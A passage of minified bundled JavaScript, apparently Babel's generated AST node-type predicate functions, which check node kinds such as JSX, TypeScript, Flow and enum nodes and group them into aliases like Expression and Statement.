Q==null||(0,S.default)(X,Q)}function ey(X,Q){if(!X)return!1;if(X.type!=="EnumStringBody")return!1;return Q==null||(0,S.default)(X,Q)}function Xg(X,Q){if(!X)return!1;if(X.type!=="EnumSymbolBody")return!1;return Q==null||(0,S.default)(X,Q)}function Qg(X,Q){if(!X)return!1;if(X.type!=="EnumBooleanMember")return!1;return Q==null||(0,S.default)(X,Q)}function Jg(X,Q){if(!X)return!1;if(X.type!=="EnumNumberMember")return!1;return Q==null||(0,S.default)(X,Q)}function Yg(X,Q){if(!X)return!1;if(X.type!=="EnumStringMember")return!1;return Q==null||(0,S.default)(X,Q)}function Wg(X,Q){if(!X)return!1;if(X.type!=="EnumDefaultedMember")return!1;return Q==null||(0,S.default)(X,Q)}function Gg(X,Q){if(!X)return!1;if(X.type!=="IndexedAccessType")return!1;return Q==null||(0,S.default)(X,Q)}function Hg(X,Q){if(!X)return!1;if(X.type!=="OptionalIndexedAccessType")return!1;return Q==null||(0,S.default)(X,Q)}function $g(X,Q){if(!X)return!1;if(X.type!=="JSXAttribute")return!1;return Q==null||(0,S.default)(X,Q)}function zg(X,Q){if(!X)return!1;if(X.type!=="JSXClosingElement")return!1;return Q==null||(0,S.default)(X,Q)}function Ug(X,Q){if(!X)return!1;if(X.type!=="JSXElement")return!1;return Q==null||(0,S.default)(X,Q)}function Kg(X,Q){if(!X)return!1;if(X.type!=="JSXEmptyExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Vg(X,Q){if(!X)return!1;if(X.type!=="JSXExpressionContainer")return!1;return Q==null||(0,S.default)(X,Q)}function Bg(X,Q){if(!X)return!1;if(X.type!=="JSXSpreadChild")return!1;return Q==null||(0,S.default)(X,Q)}function qg(X,Q){if(!X)return!1;if(X.type!=="JSXIdentifier")return!1;return Q==null||(0,S.default)(X,Q)}function Zg(X,Q){if(!X)return!1;if(X.type!=="JSXMemberExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Mg(X,Q){if(!X)return!1;if(X.type!=="JSXNamespacedName")return!1;return Q==null||(0,S.default)(X,Q)}function jg(X,Q){if(!X)return!1;if(X.type!=="JSXOpeningElement")return!1;return Q==null||(0,S.default)(X,Q)}function Fg(X,Q){if(!X)return!1;if(X.type!=="JSXSpreadAttribute")return!1;return Q==null||(0,S.default)(X,Q)}function Og(X,Q){if(!X)return!1;if(X.type!=="JSXText")return!1;return Q==null||(0,S.default)(X,Q)}function Ag(X,Q){if(!X)return!1;if(X.type!=="JSXFragment")return!1;return Q==null||(0,S.default)(X,Q)}function Rg(X,Q){if(!X)return!1;if(X.type!=="JSXOpeningFragment")return!1;return Q==null||(0,S.default)(X,Q)}function Lg(X,Q){if(!X)return!1;if(X.type!=="JSXClosingFragment")return!1;return Q==null||(0,S.default)(X,Q)}function Dg(X,Q){if(!X)return!1;if(X.type!=="Noop")return!1;return Q==null||(0,S.default)(X,Q)}function Ng(X,Q){if(!X)return!1;if(X.type!=="Placeholder")return!1;return Q==null||(0,S.default)(X,Q)}function wg(X,Q){if(!X)return!1;if(X.type!=="V8IntrinsicIdentifier")return!1;return Q==null||(0,S.default)(X,Q)}function Ig(X,Q){if(!X)return!1;if(X.type!=="ArgumentPlaceholder")return!1;return Q==null||(0,S.default)(X,Q)}function Cg(X,Q){if(!X)return!1;if(X.type!=="BindExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Pg(X,Q){if(!X)return!1;if(X.type!=="Decorator")return!1;return Q==null||(0,S.default)(X,Q)}function Sg(X,Q){if(!X)return!1;if(X.type!=="DoExpression")return!1;return Q==null||(0,S.default)(X,Q)}function Eg(X,Q){if(!X)return!1;if(X.type!=="ExportDefaultSpecifier")return!1;return Q==null||(0,S.default)(X,Q)}function Tg(X,Q){if(!X)return!1;if(X.type!=="RecordExpression")return!1;return Q==null||(0,S.default)(X,Q)}function _g(X,Q){if(!X)return!1;if(X.type!=="TupleExpression")return!1;return Q==null||(0,S.default)(X,Q)}function kg(X,Q){if(!X)return!1;if(X.type!=="DecimalLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function bg(X,Q){if(!X)return!1;if(X.type!=="ModuleExpression")return!1;return Q==null||(0,S.default)(X,Q)}function vg(X,Q){if(!X)return!1;if(X.type!=="TopicReference")return!1;return Q==null||(0,S.default)(X,Q)}function xg(X,Q){if(!X)return!1;if(X.type!=="PipelineTopicExpression")return!1;return Q==null||(0,S.default)(X,Q)}function fg(X,Q){if(!X)return!1;if(X.type!=="PipelineBareFunction")return!1;return Q==null||(0,S.default)(X,Q)}function hg(X,Q){if(!X)return!1;if(X.type!=="PipelinePrimaryTopicReference")return!1;return Q==null||(0,S.default)(X,Q)}function yg(X,Q){if(!X)return!1;if(X.type!=="VoidPattern")return!1;return Q==null||(0,S.default)(X,Q)}function gg(X,Q){if(!X)return!1;if(X.type!=="TSParameterProperty")return!1;return Q==null||(0,S.default)(X,Q)}function mg(X,Q){if(!X)return!1;if(X.type!=="TSDeclareFunction")return!1;return Q==null||(0,S.default)(X,Q)}function ug(X,Q){if(!X)return!1;if(X.type!=="TSDeclareMethod")return!1;return Q==null||(0,S.default)(X,Q)}function cg(X,Q){if(!X)return!1;if(X.type!=="TSQualifiedName")return!1;return Q==null||(0,S.default)(X,Q)}function lg(X,Q){if(!X)return!1;if(X.type!=="TSCallSignatureDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function pg(X,Q){if(!X)return!1;if(X.type!=="TSConstructSignatureDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function dg(X,Q){if(!X)return!1;if(X.type!=="TSPropertySignature")return!1;return Q==null||(0,S.default)(X,Q)}function ig(X,Q){if(!X)return!1;if(X.type!=="TSMethodSignature")return!1;return Q==null||(0,S.default)(X,Q)}function rg(X,Q){if(!X)return!1;if(X.type!=="TSIndexSignature")return!1;return Q==null||(0,S.default)(X,Q)}function ng(X,Q){if(!X)return!1;if(X.type!=="TSAnyKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function ag(X,Q){if(!X)return!1;if(X.type!=="TSBooleanKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function og(X,Q){if(!X)return!1;if(X.type!=="TSBigIntKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function sg(X,Q){if(!X)return!1;if(X.type!=="TSIntrinsicKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function tg(X,Q){if(!X)return!1;if(X.type!=="TSNeverKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function eg(X,Q){if(!X)return!1;if(X.type!=="TSNullKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Xm(X,Q){if(!X)return!1;if(X.type!=="TSNumberKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Qm(X,Q){if(!X)return!1;if(X.type!=="TSObjectKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Jm(X,Q){if(!X)return!1;if(X.type!=="TSStringKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Ym(X,Q){if(!X)return!1;if(X.type!=="TSSymbolKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Wm(X,Q){if(!X)return!1;if(X.type!=="TSUndefinedKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Gm(X,Q){if(!X)return!1;if(X.type!=="TSUnknownKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function Hm(X,Q){if(!X)return!1;if(X.type!=="TSVoidKeyword")return!1;return Q==null||(0,S.default)(X,Q)}function $m(X,Q){if(!X)return!1;if(X.type!=="TSThisType")return!1;return Q==null||(0,S.default)(X,Q)}function zm(X,Q){if(!X)return!1;if(X.type!=="TSFunctionType")return!1;return Q==null||(0,S.default)(X,Q)}function Um(X,Q){if(!X)return!1;if(X.type!=="TSConstructorType")return!1;return Q==null||(0,S.default)(X,Q)}function Km(X,Q){if(!X)return!1;if(X.type!=="TSTypeReference")return!1;return Q==null||(0,S.default)(X,Q)}function Vm(X,Q){if(!X)return!1;if(X.type!=="TSTypePredicate")return!1;return Q==null||(0,S.default)(X,Q)}function Bm(X,Q){if(!X)return!1;if(X.type!=="TSTypeQuery")return!1;return Q==null||(0,S.default)(X,Q)}function qm(X,Q){if(!X)return!1;if(X.type!=="TSTypeLiteral")return!1;return Q==null||(0,S.default)(X,Q)}function Zm(X,Q){if(!X)return!1;if(X.type!=="TSArrayType")return!1;return Q==null||(0,S.default)(X,Q)}function Mm(X,Q){if(!X)return!1;if(X.type!=="TSTupleType")return!1;return Q==null||(0,S.default)(X,Q)}function jm(X,Q){if(!X)return!1;if(X.type!=="TSOptionalType")return!1;return Q==null||(0,S.default)(X,Q)}function Fm(X,Q){if(!X)return!1;if(X.type!=="TSRestType")return!1;return Q==null||(0,S.default)(X,Q)}function Om(X,Q){if(!X)return!1;if(X.type!=="TSNamedTupleMember")return!1;return Q==null||(0,S.default)(X,Q)}function Am(X,Q){if(!X)return!1;if(X.type!=="TSUnionType")return!1;return Q==null||(0,S.default)(X,Q)}function Rm(X,Q){if(!X)return!1;if(X.type!=="TSIntersectionType")return!1;return Q==null||(0,S.default)(X,Q)}function Lm(X,Q){if(!X)return!1;if(X.type!=="TSConditionalType")return!1;return Q==null||(0,S.default)(X,Q)}function Dm(X,Q){if(!X)return!1;if(X.type!=="TSInferType")return!1;return Q==null||(0,S.default)(X,Q)}function Nm(X,Q){if(!X)return!1;if(X.type!=="TSParenthesizedType")return!1;return Q==null||(0,S.default)(X,Q)}function wm(X,Q){if(!X)return!1;if(X.type!=="TSTypeOperator")return!1;return Q==null||(0,S.default)(X,Q)}function Im(X,Q){if(!X)return!1;if(X.type!=="TSIndexedAccessType")return!1;return Q==null||(0,S.default)(X,Q)}function Cm(X,Q){if(!X)return!1;if(X.type!=="TSMappedType")return!1;return Q==null||(0,S.default)(X,Q)}function Pm(X,Q){if(!X)return!1;if(X.type!=="TSTemplateLiteralType")return!1;return Q==null||(0,S.default)(X,Q)}function Sm(X,Q){if(!X)return!1;if(X.type!=="TSLiteralType")return!1;return Q==null||(0,S.default)(X,Q)}function Em(X,Q){if(!X)return!1;if(X.type!=="TSExpressionWithTypeArguments")return!1;return Q==null||(0,S.default)(X,Q)}function Tm(X,Q){if(!X)return!1;if(X.type!=="TSInterfaceDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function _m(X,Q){if(!X)return!1;if(X.type!=="TSInterfaceBody")return!1;return Q==null||(0,S.default)(X,Q)}function km(X,Q){if(!X)return!1;if(X.type!=="TSTypeAliasDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function bm(X,Q){if(!X)return!1;if(X.type!=="TSInstantiationExpression")return!1;return Q==null||(0,S.default)(X,Q)}function vm(X,Q){if(!X)return!1;if(X.type!=="TSAsExpression")return!1;return Q==null||(0,S.default)(X,Q)}function xm(X,Q){if(!X)return!1;if(X.type!=="TSSatisfiesExpression")return!1;return Q==null||(0,S.default)(X,Q)}function fm(X,Q){if(!X)return!1;if(X.type!=="TSTypeAssertion")return!1;return Q==null||(0,S.default)(X,Q)}function hm(X,Q){if(!X)return!1;if(X.type!=="TSEnumBody")return!1;return Q==null||(0,S.default)(X,Q)}function ym(X,Q){if(!X)return!1;if(X.type!=="TSEnumDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function gm(X,Q){if(!X)return!1;if(X.type!=="TSEnumMember")return!1;return Q==null||(0,S.default)(X,Q)}function mm(X,Q){if(!X)return!1;if(X.type!=="TSModuleDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function um(X,Q){if(!X)return!1;if(X.type!=="TSModuleBlock")return!1;return Q==null||(0,S.default)(X,Q)}function cm(X,Q){if(!X)return!1;if(X.type!=="TSImportType")return!1;return Q==null||(0,S.default)(X,Q)}function lm(X,Q){if(!X)return!1;if(X.type!=="TSImportEqualsDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function pm(X,Q){if(!X)return!1;if(X.type!=="TSExternalModuleReference")return!1;return Q==null||(0,S.default)(X,Q)}function dm(X,Q){if(!X)return!1;if(X.type!=="TSNonNullExpression")return!1;return Q==null||(0,S.default)(X,Q)}function im(X,Q){if(!X)return!1;if(X.type!=="TSExportAssignment")return!1;return Q==null||(0,S.default)(X,Q)}function rm(X,Q){if(!X)return!1;if(X.type!=="TSNamespaceExportDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function nm(X,Q){if(!X)return!1;if(X.type!=="TSTypeAnnotation")return!1;return Q==null||(0,S.default)(X,Q)}function am(X,Q){if(!X)return!1;if(X.type!=="TSTypeParameterInstantiation")return!1;return Q==null||(0,S.default)(X,Q)}function om(X,Q){if(!X)return!1;if(X.type!=="TSTypeParameterDeclaration")return!1;return Q==null||(0,S.default)(X,Q)}function sm(X,Q){if(!X)return!1;if(X.type!=="TSTypeParameter")return!1;return Q==null||(0,S.default)(X,Q)}function tm(X,Q){if(!X)return!1;switch(X.type){case"ArrayExpression":case"AssignmentExpression":case"BinaryExpression":case"InterpreterDirective":case"Directive":case"DirectiveLiteral":case"BlockStatement":case"BreakStatement":case"CallExpression":case"CatchClause":case"ConditionalExpression":case"ContinueStatement":case"DebuggerStatement":case"DoWhileStatement":case"EmptyStatement":case"ExpressionStatement":case"File":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Identifier":case"IfStatement":case"LabeledStatement":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"LogicalExpression":case"MemberExpression":case"NewExpression":case"Program":case"ObjectExpression":case"ObjectMethod":case"ObjectProperty":case"RestElement":case"ReturnStatement":case"SequenceExpression":case"ParenthesizedExpression":case"SwitchCase":case"SwitchStatement":case"ThisExpression":case"ThrowStatement":case"TryStatement":case"UnaryExpression":case"UpdateExpression":case"VariableDeclaration":case"VariableDeclarator":case"WhileStatement":case"WithStatement":case"AssignmentPattern":case"ArrayPattern":case"ArrowFunctionExpression":case"ClassBody":case"ClassExpression":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ExportSpecifier":case"ForOfStatement":case"ImportDeclaration":case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":case"ImportExpression":case"MetaProperty":case"ClassMethod":case"ObjectPattern":case"SpreadElement":case"Super":case"TaggedTemplateExpression":case"TemplateElement":case"TemplateLiteral":case"YieldExpression":case"AwaitExpression":case"Import":case"BigIntLiteral":case"ExportNamespaceSpecifier":case"OptionalMemberExpression":case"OptionalCallExpression":case"ClassProperty":case"ClassAccessorProperty":case"ClassPrivateProperty":case"ClassPrivateMethod":case"PrivateName":case"StaticBlock":case"ImportAttribute":break;case"Placeholder":switch(X.expectedNode){case"Identifier":case"StringLiteral":case"BlockStatement":case"ClassBody":break;default:return!1}break;default:return!1}return Q==null||(0,S.default)(X,Q)}function em(X,Q){if(!X)return!1;switch(X.type){case"ArrayExpression":case"AssignmentExpression":case"BinaryExpression":case"CallExpression":case"ConditionalExpression":case"FunctionExpression":case"Identifier":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"LogicalExpression":case"MemberExpression":case"NewExpression":case"ObjectExpression":case"SequenceExpression":case"ParenthesizedExpression":case"ThisExpression":case"UnaryExpression":case"UpdateExpression":case"ArrowFunctionExpression":case"ClassExpression":case"ImportExpression":case"MetaProperty":case"Super":case"TaggedTemplateExpression":case"TemplateLiteral":case"YieldExpression":case"AwaitExpression":case"Import":case"BigIntLiteral":case"OptionalMemberExpression":case"OptionalCallExpression":case"TypeCastExpression":case"JSXElement":case"JSXFragment":case"BindExpression":case"DoExpression":case"RecordExpression":case"TupleExpression":case"DecimalLiteral":case"ModuleExpression":case"TopicReference":case"PipelineTopicExpression":case"PipelineBareFunction":case"PipelinePrimaryTopicReference":case"TSInstantiationExpression":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Expression":case"Identifier":case"StringLiteral":break;default:return!1}break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Xu(X,Q){if(!X)return!1;switch(X.type){case"BinaryExpression":case"LogicalExpression":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Qu(X,Q){if(!X)return!1;switch(X.type){case"BlockStatement":case"CatchClause":case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Program":case"ObjectMethod":case"SwitchStatement":case"WhileStatement":case"ArrowFunctionExpression":case"ClassExpression":case"ClassDeclaration":case"ForOfStatement":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Ju(X,Q){if(!X)return!1;switch(X.type){case"BlockStatement":case"CatchClause":case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"FunctionExpression":case"Program":case"ObjectMethod":case"SwitchStatement":case"WhileStatement":case"ArrowFunctionExpression":case"ForOfStatement":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Yu(X,Q){if(!X)return!1;switch(X.type){case"BlockStatement":case"Program":case"TSModuleBlock":break;case"Placeholder":if(X.expectedNode==="BlockStatement")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Wu(X,Q){if(!X)return!1;switch(X.type){case"BlockStatement":case"BreakStatement":case"ContinueStatement":case"DebuggerStatement":case"DoWhileStatement":case"EmptyStatement":case"ExpressionStatement":case"ForInStatement":case"ForStatement":case"FunctionDeclaration":case"IfStatement":case"LabeledStatement":case"ReturnStatement":case"SwitchStatement":case"ThrowStatement":case"TryStatement":case"VariableDeclaration":case"WhileStatement":case"WithStatement":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ForOfStatement":case"ImportDeclaration":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":case"EnumDeclaration":case"TSDeclareFunction":case"TSInterfaceDeclaration":case"TSTypeAliasDeclaration":case"TSEnumDeclaration":case"TSModuleDeclaration":case"TSImportEqualsDeclaration":case"TSExportAssignment":case"TSNamespaceExportDeclaration":break;case"Placeholder":switch(X.expectedNode){case"Statement":case"Declaration":case"BlockStatement":break;default:return!1}break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Gu(X,Q){if(!X)return!1;switch(X.type){case"BreakStatement":case"ContinueStatement":case"ReturnStatement":case"ThrowStatement":case"YieldExpression":case"AwaitExpression":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Hu(X,Q){if(!X)return!1;switch(X.type){case"BreakStatement":case"ContinueStatement":case"ReturnStatement":case"ThrowStatement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function $u(X,Q){if(!X)return!1;switch(X.type){case"ConditionalExpression":case"IfStatement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function zu(X,Q){if(!X)return!1;switch(X.type){case"DoWhileStatement":case"ForInStatement":case"ForStatement":case"WhileStatement":case"ForOfStatement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Uu(X,Q){if(!X)return!1;switch(X.type){case"DoWhileStatement":case"WhileStatement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Ku(X,Q){if(!X)return!1;switch(X.type){case"ExpressionStatement":case"ParenthesizedExpression":case"TypeCastExpression":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Vu(X,Q){if(!X)return!1;switch(X.type){case"ForInStatement":case"ForStatement":case"ForOfStatement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Bu(X,Q){if(!X)return!1;switch(X.type){case"ForInStatement":case"ForOfStatement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function qu(X,Q){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"ObjectMethod":case"ArrowFunctionExpression":case"ClassMethod":case"ClassPrivateMethod":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Zu(X,Q){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"ObjectMethod":case"ArrowFunctionExpression":case"ClassMethod":case"ClassPrivateMethod":case"StaticBlock":case"TSModuleBlock":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Mu(X,Q){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"FunctionExpression":case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"ArrowFunctionExpression":case"BigIntLiteral":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function ju(X,Q){if(!X)return!1;switch(X.type){case"FunctionDeclaration":case"VariableDeclaration":case"ClassDeclaration":case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ImportDeclaration":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":case"EnumDeclaration":case"TSDeclareFunction":case"TSInterfaceDeclaration":case"TSTypeAliasDeclaration":case"TSEnumDeclaration":case"TSModuleDeclaration":case"TSImportEqualsDeclaration":break;case"Placeholder":if(X.expectedNode==="Declaration")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Fu(X,Q){if(!X)return!1;switch(X.type){case"Identifier":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":break;case"Placeholder":if(X.expectedNode==="Identifier")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Ou(X,Q){if(!X)return!1;switch(X.type){case"Identifier":case"MemberExpression":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Pattern":case"Identifier":break;default:return!1}break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Au(X,Q){if(!X)return!1;switch(X.type){case"Identifier":case"MemberExpression":case"RestElement":case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"TSParameterProperty":case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":break;case"Placeholder":switch(X.expectedNode){case"Pattern":case"Identifier":break;default:return!1}break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Ru(X,Q){if(!X)return!1;switch(X.type){case"Identifier":case"TSQualifiedName":break;case"Placeholder":if(X.expectedNode==="Identifier")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Lu(X,Q){if(!X)return!1;switch(X.type){case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"RegExpLiteral":case"TemplateLiteral":case"BigIntLiteral":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Du(X,Q){if(!X)return!1;switch(X.type){case"StringLiteral":case"NumericLiteral":case"NullLiteral":case"BooleanLiteral":case"BigIntLiteral":case"JSXAttribute":case"JSXClosingElement":case"JSXElement":case"JSXExpressionContainer":case"JSXSpreadChild":case"JSXOpeningElement":case"JSXText":case"JSXFragment":case"JSXOpeningFragment":case"JSXClosingFragment":case"DecimalLiteral":break;case"Placeholder":if(X.expectedNode==="StringLiteral")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Nu(X,Q){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ObjectProperty":case"ObjectTypeInternalSlot":case"ObjectTypeCallProperty":case"ObjectTypeIndexer":case"ObjectTypeProperty":case"ObjectTypeSpreadProperty":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function wu(X,Q){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ClassMethod":case"ClassPrivateMethod":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Iu(X,Q){if(!X)return!1;switch(X.type){case"ObjectMethod":case"ObjectProperty":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Cu(X,Q){if(!X)return!1;switch(X.type){case"ObjectProperty":case"ClassProperty":case"ClassAccessorProperty":case"ClassPrivateProperty":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Pu(X,Q){if(!X)return!1;switch(X.type){case"UnaryExpression":case"SpreadElement":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Su(X,Q){if(!X)return!1;switch(X.type){case"AssignmentPattern":case"ArrayPattern":case"ObjectPattern":case"VoidPattern":break;case"Placeholder":if(X.expectedNode==="Pattern")break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Eu(X,Q){if(!X)return!1;switch(X.type){case"ClassExpression":case"ClassDeclaration":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function LZ(X,Q){if(!X)return!1;switch(X.type){case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":case"ImportDeclaration":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function Tu(X,Q){if(!X)return!1;switch(X.type){case"ExportAllDeclaration":case"ExportDefaultDeclaration":case"ExportNamedDeclaration":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function _u(X,Q){if(!X)return!1;switch(X.type){case"ExportSpecifier":case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":case"ExportNamespaceSpecifier":case"ExportDefaultSpecifier":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function ku(X,Q){if(!X)return!1;switch(X.type){case"ClassAccessorProperty":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function bu(X,Q){if(!X)return!1;switch(X.type){case"ClassPrivateProperty":case"ClassPrivateMethod":case"PrivateName":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function vu(X,Q){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"ArrayTypeAnnotation":case"BooleanTypeAnnotation":case"BooleanLiteralTypeAnnotation":case"NullLiteralTypeAnnotation":case"ClassImplements":case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"DeclaredPredicate":case"ExistsTypeAnnotation":case"FunctionTypeAnnotation":case"FunctionTypeParam":case"GenericTypeAnnotation":case"InferredPredicate":case"InterfaceExtends":case"InterfaceDeclaration":case"InterfaceTypeAnnotation":case"IntersectionTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NullableTypeAnnotation":case"NumberLiteralTypeAnnotation":case"NumberTypeAnnotation":case"ObjectTypeAnnotation":case"ObjectTypeInternalSlot":case"ObjectTypeCallProperty":case"ObjectTypeIndexer":case"ObjectTypeProperty":case"ObjectTypeSpreadProperty":case"OpaqueType":case"QualifiedTypeIdentifier":case"StringLiteralTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"TupleTypeAnnotation":case"TypeofTypeAnnotation":case"TypeAlias":case"TypeAnnotation":case"TypeCastExpression":case"TypeParameter":case"TypeParameterDeclaration":case"TypeParameterInstantiation":case"UnionTypeAnnotation":case"Variance":case"VoidTypeAnnotation":case"EnumDeclaration":case"EnumBooleanBody":case"EnumNumberBody":case"EnumStringBody":case"EnumSymbolBody":case"EnumBooleanMember":case"EnumNumberMember":case"EnumStringMember":case"EnumDefaultedMember":case"IndexedAccessType":case"OptionalIndexedAccessType":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function xu(X,Q){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"ArrayTypeAnnotation":case"BooleanTypeAnnotation":case"BooleanLiteralTypeAnnotation":case"NullLiteralTypeAnnotation":case"ExistsTypeAnnotation":case"FunctionTypeAnnotation":case"GenericTypeAnnotation":case"InterfaceTypeAnnotation":case"IntersectionTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NullableTypeAnnotation":case"NumberLiteralTypeAnnotation":case"NumberTypeAnnotation":case"ObjectTypeAnnotation":case"StringLiteralTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"TupleTypeAnnotation":case"TypeofTypeAnnotation":case"UnionTypeAnnotation":case"VoidTypeAnnotation":case"IndexedAccessType":case"OptionalIndexedAccessType":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function fu(X,Q){if(!X)return!1;switch(X.type){case"AnyTypeAnnotation":case"BooleanTypeAnnotation":case"NullLiteralTypeAnnotation":case"MixedTypeAnnotation":case"EmptyTypeAnnotation":case"NumberTypeAnnotation":case"StringTypeAnnotation":case"SymbolTypeAnnotation":case"ThisTypeAnnotation":case"VoidTypeAnnotation":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function hu(X,Q){if(!X)return!1;switch(X.type){case"DeclareClass":case"DeclareFunction":case"DeclareInterface":case"DeclareModule":case"DeclareModuleExports":case"DeclareTypeAlias":case"DeclareOpaqueType":case"DeclareVariable":case"DeclareExportDeclaration":case"DeclareExportAllDeclaration":case"InterfaceDeclaration":case"OpaqueType":case"TypeAlias":break;default:return!1}return Q==null||(0,S.default)(X,Q)}function 